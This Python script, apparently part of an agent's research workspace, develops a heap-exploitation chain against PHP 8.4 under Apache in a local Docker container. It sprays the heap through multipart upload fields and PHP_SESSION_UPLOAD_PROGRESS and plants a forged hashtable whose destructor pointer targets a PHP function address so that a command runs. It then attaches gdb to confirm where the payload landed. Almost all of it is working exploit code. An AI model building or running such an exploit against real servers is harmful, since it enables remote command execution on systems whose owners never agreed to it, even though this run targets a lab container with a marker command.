#!/usr/bin/env python3
import json, os, subprocess, sys, time
D="/tmp/opencode/research/modphp_84_matrix_20261023T074116Z"
sys.path.insert(0, os.path.join(D,"scripts"))
sys.path.insert(0, "/tmp/opencode/research/9bie_update_20261022T115026Z/code/repo/pure")
import chain84 as C
from fake_ref_b import make_spray, make_name
from mk_ht import build as build_ht
CNAME="m109-d8424pkg"; PORT=18740; LOG="/var/log/apache2/p2s-access.log"; BOUND=b"C"*10
def sh(cmd): return subprocess.run(cmd, capture_output=True, text=True)
def lines(): return sh(["docker","exec",CNAME,"sh","-c","cat %s 2>/dev/null"%LOG]).stdout.splitlines()
def state(pid):
    r=sh(["docker","exec",CNAME,"gdb","-batch","-q","-p",str(pid),"-x","/tmp/deb_state.gdb"])
    for l in r.stdout.splitlines():
        if l.startswith("DEBSTATE"): return dict(kv.split("=",1) for kv in l.split()[1:])
    return {}
def b2(S,zif,cmd,rc=2,n1=500,n2=495,vl=384):
    spray=make_spray(vl,S,rc,0x0107,8,32); ht=build_ht(S,zif,cmd.encode(),384)
    def part(n,v): return b"--"+BOUND+b"\r\nContent-Disposition: form-data; name=\""+n+b"\"\r\n\r\n"+v+b"\r\n"
    body=bytearray()
    for i in range(n1): body+=part(make_name(b"s",i,10),spray)
    body+=part(b"ht",ht); body+=part(b"PHPSESSID",b"a"*32); body+=part(b"PHP_SESSION_UPLOAD_PROGRESS",b"k0")
    for i in range(n2): body+=part(make_name(b"t",i,10),spray)
    body+=b"--"+BOUND+b"--\r\n"
    return bytes(body)
print("restart",flush=True); sh(["docker","restart",CNAME]); time.sleep(1.8)
n=len(lines()); r=C.send_plain(PORT,"/index.php",C.a2_body(fillers=116)); time.sleep(0.4)
lg=lines()[n:]; pid=int(lg[-1].split()[0]) if lg else None
st=state(pid) if pid else {}
print("A2",r.split(b"\r\n",1)[0],"pid",pid,st,flush=True)
main=int(st["main"],16); lib=int(st["lib"],16); hsv=int(st["hsv"],16)
S0=main+0xF8398; zif=lib+0x24CDD0
cmd="DEBTRIG_%06x"%(int(time.time())&0xFFFFFF)
body=b2(S0,zif,cmd,rc=2)
sh(["docker","cp",os.path.join(D,"scripts/deb_dump_at_bp.gdb"),CNAME+":/tmp/deb_dump_at_bp.gdb"])
sh(["docker","exec",CNAME,"sh","-c","rm -f /tmp/chunk_bp.bin"])
gp=subprocess.Popen(["docker","exec",CNAME,"gdb","-batch","-q","-p",str(pid),"-x","/tmp/deb_dump_at_bp.gdb"],
                    stdout=open(os.path.join(D,"out/bp_dump.txt"),"wb"),stderr=subprocess.STDOUT)
time.sleep(1.6); print("gdb poll",gp.poll(),flush=True)
hit=False
for k in range(8):
    n2=len(lines()); resp=C.send_plain(PORT,"/index.php",body,timeout=300); time.sleep(0.3)
    lg=lines()[n2:]; p=int(lg[-1].split()[0]) if lg else None
    print("B2",k,"pid",p,resp.split(b"\r\n",1)[0],flush=True)
    if p==pid:
        hit=True; break
for i in range(80):
    if gp.poll() is not None: break
    time.sleep(0.25)
if gp.poll() is None: gp.kill(); gp.wait()
out=open(os.path.join(D,"out/bp_dump.txt"),encoding="latin1").read()
print("=== GDB ===",flush=True); print(out[-3000:],flush=True)
cp=sh(["docker","cp",CNAME+":/tmp/chunk_bp.bin",os.path.join(D,"out/chunk_bp.bin")])
import struct
found=[]; cands=[]
if cp.returncode==0:
    data=open(os.path.join(D,"out/chunk_bp.bin"),"rb").read()
    needle=cmd.encode()
    i=0
    while True:
        i=data.find(needle,i)
        if i<0: break
        found.append(i)
        i += 1
        so=i-1-0x98
        ok=False; hdr=b""; pd=0; ctype=0
        if so>=0:
            hdr=data[so:so+8]; ctype=struct.unpack_from("<I",data,so+4)[0] if so+8<=len(data) else 0
            if so+0x38<=len(data): pd=struct.unpack_from("<Q",data,so+0x30)[0]
            ok = hdr==b"\x01\x00\x00\x00\x07\x00\x00\x00"
        if ok:
            cands.append({"chunk_off":i,"S":main+so,"hdr":hdr.hex(),"pDestructor":pd,"zif":zif,"pd_match":pd==zif})
        print("OCC off=%#x S=%#x hdr=%s pDestructor=%#x zif=%#x ok=%s" % (i, main+so if so>=0 else 0, hdr.hex(), pd, zif, ok), flush=True)
print("MARKER %r found at chunk offsets %s"%(cmd,[hex(x) for x in found]),flush=True)
print("CANDIDATES %s"%cands,flush=True)
json.dump({"pid":pid,"hsv":hex(hsv),"main":hex(main),"cmd":cmd,"found":found,
           "candidates":cands,"S":[c["S"] for c in cands]},open(os.path.join(D,"out/trig.json"),"w"),indent=1)
